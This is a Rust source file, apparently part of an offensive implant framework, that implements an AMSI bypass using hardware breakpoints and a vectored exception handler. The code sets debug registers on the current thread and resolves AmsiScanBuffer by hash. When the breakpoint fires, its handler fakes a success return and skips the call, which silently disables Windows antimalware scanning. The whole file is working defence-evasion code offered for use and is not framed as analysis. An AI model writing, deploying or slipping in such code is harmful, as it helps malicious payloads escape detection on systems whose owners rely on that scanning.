/**
 * Unified VEH handler for all hardware breakpiont bypass.
 * DR0-DR3 each one can hold one function address and when any of these function called the CPU STATUS_SINGLE_STEP and our VEH handlers do this:
 *  - Set RAX = 0 (STATUS_SUCCESS)
 *  - Advances the RIP to return address
 *  - Pops RSP (Skip the intercepted function entirely) 
 * */

use core::ffi::c_void;
use core::sync::atomic::{AtomicBool, AtomicUsize, Ordering};

use crate::debug;
use crate::core::{hashes, resolver, ssn_table};
use crate::core::types::*;
use crate::core::nt;

// Just to make sure the handler is registred exactly once.
static VEH_REGISTERED: AtomicBool = AtomicBool::new(false);

// Breakpoint addresses for DR0-DR3. The VEH handler checks the exception 
static HWBP_ADDRS: [AtomicUsize; 4] = [
    AtomicUsize::new(0),
    AtomicUsize::new(0),
    AtomicUsize::new(0),
    AtomicUsize::new(0),
];

pub(crate) unsafe fn ensure_veh_registered() -> bool { unsafe {
    if VEH_REGISTERED.load(Ordering::SeqCst) {
        return true;
    }

    let table = ssn_table::syscall_table();
    if table.win32.rtl_add_vectored_exception_handler.is_null() {
        debug!("[HWBP] RtlAddVectoredExceptionHandler not resolved");
        return false
    }

    let add_veh: extern "system" fn(u32, unsafe extern "system" fn(*mut ExceptionPointers) -> i32) -> *mut c_void = core::mem::transmute(table.win32.rtl_add_vectored_exception_handler); 

    let handle = add_veh(1, hwbp_exception_handler);
    if handle.is_null() {
        debug!("[HWBP] Failed to register VEH handler");
        return false;
    }

    VEH_REGISTERED.store(true, Ordering::SeqCst);
    debug!("[HWBP] VEH handler registered (first in chain)");
    true
}}

unsafe extern "system" fn hwbp_exception_handler(excpetion_info: *mut ExceptionPointers) -> i32 { unsafe {
    let record = &*(*excpetion_info).exception_record;
    let context = &mut *(*excpetion_info).context_record;

    // Only handle STATUS_SINGLE_STEP (hardware breakpint)
    if record.exception_code != STATUS_SINGLE_STEP {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let rip = context.rip() as usize;

    // Check if breakpiont address matches any registred slots
    for addr in &HWBP_ADDRS {
        let target = addr.load(Ordering::SeqCst);
        if target != 0 && rip == target {
            // Bypass: RAX = 0, RIP = return addr, RSP += 8
            let rsp = context.rsp();
            let return_addr = *(rsp as *const u64);
            context.set_rax(0); // STATUS_SUCCESS
            context.set_rip(return_addr);
            context.set_rsp(rsp + 8);
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }

    EXCEPTION_CONTINUE_SEARCH
}}

pub(crate) unsafe fn set_hardware_breakpint(slot: usize, target_addr: usize) -> bool { unsafe {
    if slot > 3 || target_addr == 0 {
        return false;
    }

    // Ensure VEH handler is ative before setting any breakpint
    if !ensure_veh_registered() {
        return false;
    }

    // Store address for VEH handler
    HWBP_ADDRS[slot].store(target_addr, Ordering::SeqCst);
    
    let current_thread: HANDLE = -2isize as HANDLE; // NtCurrentThread()

    let mut ctx = Context64::zeroed();
    ctx.set_flags(CONTEXT_DEBUG_REGISTERS);

    let status = nt::nt_get_context_thread(current_thread, &mut ctx);
    if status != STATUS_SUCCESS {
        debug!("[HWBP] NtGetContextThread failed: 0x{:08X}", status);
        return false;
    }

    // Set the DR register for this slot
    match slot {
        0 => ctx.set_dr0(target_addr as u64),
        1 => {
            // DR1 at offset 0x50
            ctx.data[0x50..0x58].copy_from_slice(&(target_addr as u64).to_le_bytes());
        }
        2 => {
            // DR2 at offset 0x58
            ctx.data[0x58..0x60].copy_from_slice(&(target_addr as u64).to_le_bytes());
        }
        3 => {
            // DR3 at offset 0x60
            ctx.data[0x60..0x68].copy_from_slice(&(target_addr as u64).to_le_bytes());
        }
        _ => unreachable!(),
    }


    /*
     * Enable this slot in DR7:
     *  L0 = bit 0, L1 = bit 2, L2 = bit 4, l3 = bit 6 (local enable)
     *  R/W bits and LEN bits stay 00 (execute breakpint, 1-byte) 
     * */
    let mut dr7 = ctx.dr7();
    let enable_bit = 1u64 << (slot * 2);    // L0=bit0, L1=bit2, L2=bit4, L3=bit6
    let rw_shift = 16 + slot * 4;           // condition bits
    let len_shift = 18 + slot * 4;          // length bits 
    dr7 |= enable_bit;                      // Enable local breakpoint
    dr7 &= !(0x03 << rw_shift);             // R/W = 00 (execute)
    dr7 &= !(0x03 << len_shift);            // LNE = 00 (1 byte)
    ctx.set_dr7(dr7);

    ctx.set_flags(CONTEXT_DEBUG_REGISTERS);
    let status = nt::nt_set_context_thread(current_thread, &mut ctx);
    if status != STATUS_SUCCESS {
        debug!("[HWBP] NtSetContextThread (DR{}) failed: 0x{:08X}", slot, status);
        return false;
    }

    true
}}


pub unsafe fn patch_amsi() -> bool { unsafe {
    let amsi_module = resolver::ldr_module_search(hashes::AMSI_DLL_HASH);
    if amsi_module.is_null() {
        debug!("[AMSI] amsi.dll not loaded, skipping");
        return true;
    }

    // Resolve AmsiScanBuffer
    let amsi_scan = resolver::ldr_function_by_hash(amsi_module, hashes::AMSISCANBUFFER_HASH);
    if amsi_scan.is_null() {
        debug!("[AMSI AmsiScanBuffer not found");
        return false;
    }

    // set DR0 = AmsiScanBuffer (VEH handler registred automatically)
    if !set_hardware_breakpint(0, amsi_scan as usize) {
        return false;
    } 

    debug!("[AMSI] Hardware breakpoint on DR0={:p}", amsi_scan);
    true
}}